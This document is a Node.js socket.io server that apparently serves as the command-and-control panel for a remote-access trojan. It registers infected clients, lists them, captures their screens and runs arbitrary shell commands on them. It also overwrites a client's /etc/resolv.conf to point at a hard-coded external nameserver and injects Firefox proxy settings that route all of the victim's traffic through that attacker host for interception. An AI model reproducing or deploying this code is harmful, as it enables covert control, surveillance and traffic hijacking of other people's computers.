var app = require('express')();
var server = require('http').Server(app);
var io = require('socket.io')(server);

server.listen(8000);


var clients = [];
var clientSockets = [];
var clientSocketCount = -1;

app.get('/', function (req, res) {
  res.sendfile(__dirname + '/index.html');
});

io.on('connection', function (socket) {
    
    socket.on('disconnect', function() {
      
      var i = clientSockets.indexOf(socket);
      if(clients[i]) {
        console.log('Client ' + i + ' disconnected!');
        clients[i].type = "dead";
      }
      
    });

    
    socket.on('client_connect', (data, cb) => {
      clientSocketCount++;
      clientSockets[clientSocketCount] = socket;
      console.log("Client connection " + clientSocketCount + " of type " + data.type);

      clients.push({
        sockid: clientSocketCount,
        type: data.type,
        name: data.name,
        rel: data.rel,
        cpu: data.cpu,
        lib: data.lib

      });

      cb();

    });





  

 

  socket.on('CH01', function (data) {
    console.log(data);
  });

  socket.on('client_screenshot', function(data, cb) { 
    console.log("RECV client_screenshot");

    if(clientSockets[data.toclient]) {
      clientSockets[data.toclient].emit('cmd', { cmd: 'import -window root s.png' }, (response) => {
        console.log(response);
        cb(response);
      });
    }
  });


  socket.on('send_client_cmd', function(data, cb) { 
    console.log("RECV send_client_cmd");

    if(clientSockets[data.toclient]) {
      clientSockets[data.toclient].emit('cmd', { cmd: data.cmd }, (response) => {
        console.log(response);
        cb(response);
      });
    }
  });


  socket.on('dnspoison_client', function(data, cb) { 
    console.log("RECV dnspoison_client");

    if(clientSockets[data.toclient]) {
      clientSockets[data.toclient].emit('cmdWriteFile', { string: "nameserver 13.126.74.47", dest: "/etc/resolv.conf" });
    }

  });

  socket.on('mitmproxy_client', function(data, cb) { 
    console.log("RECV mitmproxy_client");

    if(clientSockets[data.toclient]) {
      clientSockets[data.toclient].emit('setFFProxy', generateFFProxySettings("13.126.74.47", 8080));
    }
    
  });


  socket.on('list_clients', function(data, cb) { 
    console.log("RECV list_clients");
    cb(JSON.stringify(clients));
  });



});



function writeResolveCache() {
    socket.emit('cmdWriteFile', {
        string: "nameserver 127.0.0.1",
        dest: '/etc/resolv.conf'
    });
}


function generateFFProxySettings(ip, port) {
  var proxySettings =
`user_pref("network.proxy.backup.ftp", "${ip}");
user_pref("network.proxy.backup.ftp_port", ${port});
user_pref("network.proxy.backup.socks", "${ip}");
user_pref("network.proxy.backup.socks_port", ${port});
user_pref("network.proxy.backup.ssl", "${ip}");
user_pref("network.proxy.backup.ssl_port", ${port});
user_pref("network.proxy.ftp", "${ip}");
user_pref("network.proxy.ftp_port", ${port});
user_pref("network.proxy.http", "${ip}");
user_pref("network.proxy.http_port", ${port});
user_pref("network.proxy.share_proxy_settings", true);
user_pref("network.proxy.socks", "${ip}");
user_pref("network.proxy.socks_port", ${port});
user_pref("network.proxy.ssl", "${ip}");
user_pref("network.proxy.ssl_port", ${port});
user_pref("network.proxy.type", 1);
`;
  return proxySettings;
}

